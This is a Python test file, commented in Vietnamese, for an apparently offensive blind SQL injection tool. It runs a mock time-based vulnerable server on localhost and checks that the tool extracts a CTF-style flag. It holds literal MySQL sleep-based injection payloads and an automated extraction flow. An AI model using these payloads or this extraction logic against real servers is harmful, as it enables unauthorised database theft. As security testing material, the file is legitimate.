#!/usr/bin/env python3
"""
Test transport.py END-TO-END bằng một HTTP server cục bộ mô phỏng target time-based.

Server thật (localhost) nhận {"id": payload}, đánh giá điều kiện, sleep THẬT khi đúng.
-> kiểm chứng cả stack: parse Burp -> chèn payload -> Content-Length -> gửi HTTP -> đo trễ.

Chạy:  python tests/test_transport.py
"""

import json
import os
import re
import sys
import threading
import time
from http.server import BaseHTTPRequestHandler, HTTPServer

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from stinger.request import parse_request
from stinger.transport import Transport
from stinger.vectors import VectorStore, detect_vector
from stinger.oracle import Oracle
from stinger.extract import extract, verify

SECRET = b"HTB{l0c4l_3nd2end}"
_SLEEP = 0.3  # ngắn để test nhanh


class Handler(BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass  # im lặng

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        raw = self.rfile.read(length).decode("utf-8", "replace")
        try:
            payload = json.loads(raw).get("id", "")
        except Exception:
            payload = ""

        if _eval_sql(payload, SECRET):
            time.sleep(_SLEEP)

        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(b'{"status":"ok"}')  # response luôn giống nhau (blind)


def _eval_sql(payload, secret):
    """Đánh giá điều kiện inference trong payload -> có sleep không."""
    m = re.search(r"\bif\((.*),sleep", payload)
    if not m:
        m = re.search(r"\bif\((.*),0,", payload)
    if not m:
        return False
    cond = m.group(1).strip()
    if cond == "1=1":
        return True
    if cond == "1=2":
        return False
    if "is not null" in cond:
        return True
    hexs = secret.hex().upper()
    m2 = re.search(r"^(.*)\s+between\s+(\d+)\s+and\s+(\d+)$", cond, re.I)
    if m2:
        expr, lo, hi = m2.group(1).strip(), int(m2.group(2)), int(m2.group(3))
        val = _eval_expr(expr, secret, hexs)
        return lo <= val <= hi
    m3 = re.search(r"between\s+0x([0-9a-fA-F]+)\s+and", cond)
    if m3:
        return bytes.fromhex(m3.group(1)) == secret
    return False


def _eval_expr(expr, secret, hexs):
    if expr.startswith("length("):
        return len(secret)
    if expr.startswith("char_length("):
        return len(secret.decode("utf-8", "replace"))
    m = re.search(r"ord\(substr\(\(hex\(\((.*)\)\)\),(\d+),1\)\)", expr)
    if m:
        i = int(m.group(2))
        return ord(hexs[i - 1]) if i <= len(hexs) else 0
    return -1


def _start_server():
    srv = HTTPServer(("127.0.0.1", 0), Handler)
    port = srv.server_address[1]
    th = threading.Thread(target=srv.serve_forever, daemon=True)
    th.start()
    return srv, port


def _burp_request(port):
    return (
        "POST /action.php HTTP/1.1\r\n"
        "Host: 127.0.0.1:%d\r\n"
        "User-Agent: Mozilla/5.0\r\n"
        "Content-Type: application/json\r\n"
        "Content-Length: 10\r\n"
        "Connection: close\r\n"
        "\r\n"
        '{"id":"*"}'
    ) % port


def test_end_to_end_extract():
    srv, port = _start_server()
    try:
        base = parse_request(_burp_request(port))
        transport = Transport(base, timeout=10)

        # 1) đo & chốt vector (dbms auto)
        store = VectorStore.load()
        detect = detect_vector(store, transport.measure, sleeptime=_SLEEP,
                               dbms="mysql", margin=0.5)
        assert detect.vector.dbms == "mysql"

        # 2) trích xuất flag qua HTTP thật
        oracle = Oracle(detect, transport.measure, sleeptime=_SLEEP)
        data, meta = extract(oracle, "select content from flag",
                             store.dialect("mysql"), mode="hex")

        assert data == SECRET, "got %r" % data

        # 3) verify
        assert verify(oracle, "select content from flag", store.dialect("mysql"), data)
        print("      flag = %r  (%d request)" % (data.decode(), transport.n_req))
    finally:
        srv.shutdown()


def test_content_length_correct_over_http():
    """Server đọc Content-Length để lấy body - nếu sai, payload bị cắt -> flag sai.
    Test này pass tức là Content-Length được tính đúng khi payload dài."""
    srv, port = _start_server()
    try:
        base = parse_request(_burp_request(port))
        transport = Transport(base, timeout=10)
        # payload dài hơn marker rất nhiều
        dt = transport.measure("(if(1=1,sleep(%g),1))" % _SLEEP)
        assert dt >= _SLEEP * 0.5, "sleep không kích hoạt -> Content-Length có thể sai"
        dt2 = transport.measure("(if(1=2,sleep(%g),1))" % _SLEEP)
        assert dt2 < _SLEEP * 0.5
    finally:
        srv.shutdown()


def _run_all():
    tests = [v for k, v in sorted(globals().items()) if k.startswith("test_") and callable(v)]
    passed = 0
    for t in tests:
        try:
            t()
            print("[ OK ] %s" % t.__name__)
            passed += 1
        except Exception as e:
            import traceback
            print("[FAIL] %s -> %s: %s" % (t.__name__, type(e).__name__, e))
            traceback.print_exc()
    print("\n%d/%d passed" % (passed, len(tests)))
    return passed == len(tests)


if __name__ == "__main__":
    sys.exit(0 if _run_all() else 1)
